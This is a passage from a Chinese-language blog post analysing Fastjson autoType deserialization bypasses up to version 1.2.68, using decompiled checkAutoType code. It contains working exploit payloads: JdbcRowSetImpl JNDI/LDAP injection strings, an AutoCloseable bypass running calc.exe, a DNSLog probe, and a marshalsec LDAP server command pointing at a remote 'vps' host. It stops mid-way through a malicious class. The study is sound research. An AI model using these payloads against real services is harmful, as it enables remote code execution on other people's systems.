                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    hash <span class="token operator">=</span> h3<span class="token punctuation">;</span>

                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        hash <span class="token operator">^=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        hash <span class="token operator">*=</span> 1099511628211L<span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>acceptHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>
                        <span class="token punctuation">}</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>denyHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> TypeUtils<span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span> <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    clazz <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deserializers<span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> clazz <span class="token operator">!=</span> HashMap<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        hash <span class="token operator">=</span> h3<span class="token punctuation">;</span>

                        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">char</span> c <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                            hash <span class="token operator">^=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
                            hash <span class="token operator">*=</span> 1099511628211L<span class="token punctuation">;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>denyHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>

                            <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>acceptHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                    clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span>

                                <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span>

                                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>TypeUtils<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> JSONType<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token operator">||</span> DataSource<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>

                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                        JavaBeanInfo beanInfo <span class="token operator">=</span> JavaBeanInfo<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> clazz<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>propertyNamingStrategy<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>beanInfo<span class="token punctuation">.</span>creatorConstructor <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">int</span> mask <span class="token operator">=</span> Feature<span class="token punctuation">.</span>SupportAutoType<span class="token punctuation">.</span>mask<span class="token punctuation">;</span>
                    <span class="token keyword">boolean</span> autoTypeSupport <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> <span class="token punctuation">(</span>features <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>JSON<span class="token punctuation">.</span>DEFAULT_PARSER_FEATURE <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>这回的利用点就在第一次黑白名单过去后，从缓存Map中对class的加载，所以实际的利用需要autotype关闭，在这个情况下，能把黑名单都给过掉</p>
<p>payload如下</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span>
        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>因为解析是按顺序过来的，所以一开始进checkAutoType函数的是java.lang.Class，由于这个类属于基础类，所以可以直接在<code>clazz = this.deserializers.findClass(typeName);</code>中进行加载，this.deserializers在初始化的时候往里面塞了一堆基本类，这些基本类在没有autotype的情况下也能正常反序列化，而java.lang.Class就赫然在列。获取到Class类后返回到DefaultJSONParser中的parseObject，进行反序列化，进365行的<code>obj = deserializer.deserialze(this, clazz, fieldName);</code>，在这个函数中对传入类进行了判断，对于Class类，执行loadClass操作</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>strVal<span class="token punctuation">,</span> parser<span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDefaultClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>而这个loadClass进重载的loadClass，额外设置一个cache为true的参数，最后来了这么一句</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>contextClassLoader <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> contextClassLoader <span class="token operator">!=</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">{</span>
    clazz <span class="token operator">=</span> contextClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这个map就是TypeUtils的map，也就是checkAutoType前面的这句</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里把class中value对应的类加入了这个map，接下来执行到<code>com.sun.rowset.JdbcRowSetImpl</code>类的时候，这个类已经在map里了，就能被直接加载并反序列化</p>
<p>如果开了autotype的话，反而会因为进入autotype的黑名单检测而挂掉，无法完成绕过</p>
<p>map理论上应该是用来给以前加载过的类进行一个缓存，这样子下次再遇到的时候就可以加速加载</p>
<h3 id="lt-x3D-1-2-68超级漏洞"><a href="#lt-x3D-1-2-68超级漏洞" class="headerlink" title="&lt;&#x3D;1.2.68超级漏洞"></a>&lt;&#x3D;1.2.68超级漏洞</h3><p>一开始因为我太过垃圾，直接以为1.2.48之后无敌防御了，现在才知道，到1.2.68为止还是有一个全新的超级漏洞，以及这个洞也有一两年的历史了。。。</p>
<p>学习一下，还是看checkAutoType，和48的在整体逻辑上差别不是很大，加了一个safemode，开启safemode之后就直接关掉了反序列化这个功能<br>然后还加了一个expectClassFlag，这么初始化的，就是对曾经的expectClass多套了一层过滤</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">boolean</span> expectClassFlag<span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    expectClassFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> Serializable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> Cloneable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> Closeable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> EventListener<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> Iterable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> Collection<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    expectClassFlag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    expectClassFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>之前调试的时候也看到了这个expectClass的变量值，如果expectClass存在的话，会在最后autotype没开后的load处加载的类和expectClass进行对比，如果是expectClass的子类的话，就可以返回该class（如果class在黑名单里面，那开局检查黑名单的时候就直接挂了）。</p>
<p>rmb神仙在博客中提到，在反序列化指定类的field时，可以直接无视autotype和黑白名单以及safemode<br>比如这个例子</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>test<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestThread</span> <span class="token punctuation">{</span>
    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread thread<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setThread</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread test<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>thread <span class="token operator">=</span> test<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这样<code>JSON.parseObject(serializedStr, TestThread.class);</code>是可以直接反序列化<code>&#123;&quot;thread&quot;: &#123;&quot;@type&quot;:&quot;java.lang.Thread&quot;&#125;&#125;</code>生成一个TestThread对象的，这个过程根本不需要进入checkAutoType进行检测<br>而写一个SubThread类继承Thread时，就会进入checkAutoType函数，不过会因为其是expectClass Thread类的子类而通过，黑白名单只检测传入类是否在黑名单内，而不检测expectClass是否属于黑名单类（不过rmb神仙也说了，一般来说不会有人把危险类作为某个类的参数吧，并且还要指定反序列化的是这个带有危险类field的类，并且这个时候不传@type也能直接反序列化thread类的。。）</p>
<h4 id="expectClass的意义"><a href="#expectClass的意义" class="headerlink" title="expectClass的意义"></a>expectClass的意义</h4><p>设计思路是当你load一个类A时，如果这个类A是在白名单里或允许load的，那么再反序列化它的时候就需要把它的成员变量也给实例化出来，那如果他的参数不在白名单里就凉了，所以就可以设置一个expectClass，将允许其<strong>及其子类</strong>的反序列化，以实现基本的运行逻辑</p>
<p>简单翻了翻代码，在对DefaultJSONPraser中做语义分析时调用的checkAutoType中传入的expectClass都是null，只有当checkAutoType中返回了一个class后进入到JavaBeanDeserializer.deserialze方法后，解析成员变量时会对checkAutoType传expectClass</p>
<p>那么攻击思路也就比较清晰了，找到允许反序列化类中的成员变量是一个比较祖宗的类，比如java.lang.Object，那一切都是它的子类，就能直接通过expectClass加载到我们需要的类</p>
<p>所以fastjson也做了基本的防护，在后续的版本添加了这个expectClassFlag，要求expectClass不能是如上这些祖宗类</p>
<pre class=" language-java"><code class="language-java">expectClass <span class="token operator">!=</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> Serializable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> Cloneable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> Closeable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> EventListener<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> Iterable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> Collection<span class="token punctuation">.</span><span class="token keyword">class</span>
</code></pre>
<p>看一下网传的payload<br><code>&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.z33.test.MyAutoCloseAble&quot;, &quot;cmd&quot;:&quot;calc.exe&quot;&#125;</code><br>这里的MyAutoCloseAble是一个实现了AutoCloseable接口的在构造函数里面直接rce的测试类，可能<code>AutoCloseable</code>这种接口太过祖宗，所以能直接在缓存map中找到，从而被加载。因此，就会将AutoCloseable作为expectClass进行其成员变量的加载，而MyAutoCloseAble实现了AutoCloseable，能够通过checkAutoType，在反序列化时执行构造函数完成rce</p>
<h4 id="关于expectClass的一点思考"><a href="#关于expectClass的一点思考" class="headerlink" title="关于expectClass的一点思考"></a>关于expectClass的一点思考</h4><p>因为调试比较老版本的fastjson时根本没有在checkAutoType中看见这个expectClassFlag，还以为这个是在47-68中的某个版本加上去的，如果是这样子的话，那么这段版本中就应该存在可以直接反序列化Object这类祖宗类子类的漏洞<br>先写一个拿Object做filed的类</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>test<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>
    Object object<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setObject</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>object <span class="token operator">=</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>再随便反序列化一个类<br><code>&#123;&quot;object&quot;:&#123;&quot;@type&quot;: &quot;org.z33.test.SubThread&quot;&#125;&#125;</code><br>然后我直接调试了一下47，发现在一开始整个解析流程就不对了，再进了一个ASMxx的代码段之后没法跟进看代码，在这个里面就走上了完全不同的道路。。。。<br>但是就目前我的浅陋测试代码而言，似乎在加载Object对象时不会简单的让人如愿，但是为什么呢，我也试不出来，<strong>有人知道务必教教我呜呜</strong></p>
<p>对于更高版本的防护，当然是在68中添加了额外的expectClass黑名单，包括了之前说到的<code>java.lang.AutoCloseable</code>以及<code>java.lang.Readable java.lang.Runnable</code></p>
<p>实际利用的话，就要找AutoCloseable这个类的子类都有哪些能利用了，在今年的blackhat USA上有一系列的披露，从mysql jdbc连数据库的反序列化RCE，到common io的任意文件读，还有一些结合第三方库的任意文件写<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg">关于blackhat2021披露的fastjson1.2.68链</a></p>
<p>也许对于目标环境，如果其本身指定了反序列化类的话，看看其field有没有可利用的类然后进行现场挖掘？</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>就抄几个最常见的payload</p>
<h3 id="java-net-Inet6Address"><a href="#java-net-Inet6Address" class="headerlink" title="java.net.Inet6Address"></a>java.net.Inet6Address</h3><p>经典URLDNS探测是否存在漏洞以及是否能够出网，并且由于这个类的超级普适性，在任何版本下都是可以直接利用的，大概原因可能是FastJson初始化的时候直接塞到了缓存map或者deserialize中？</p>
<p><code>&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog.cn&quot;</code><br>还有一个和它名字差不多的类，叫<code>java.net.InetAddress</code>，少个6，这个类在48版本中被加入了黑名单（看别人说的），因此可以用上述两个类对fastjson漏洞的存在和版本进行探测<br>小于48刚好用Class加载类进缓存map一键打通</p>
<h3 id="com-sun-rowset-JdbcRowSetImpl"><a href="#com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl"></a>com.sun.rowset.JdbcRowSetImpl</h3><p>靠JNDI注入远程打的，没本地依赖限制，连上我的服务器返回一个恶意类在加载时就搞定</p>
<pre class=" language-java"><code class="language-java">System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.object.trustURLCodebase"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
String serializedStr <span class="token operator">=</span> <span class="token string">"{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://127.0.0.1:10000/Test\",\"autoCommit\": true}"</span><span class="token punctuation">;</span>
Object obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>serializedStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>高版本jdk因为防了一手JNDI注入，所以需要加上前面那一句去信任远程codebase，才能加载服务器上的reference对象，所以高版本jdk默认情况不是很打得通<br>不然就超级报错<br>LDAP server是网上找的工具，以如下命令启动<br><code>$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://vps/#Test 10000</code><br>写一个Test.java，放一个static段，在加载时就跑起来</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        Runtime runtime <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
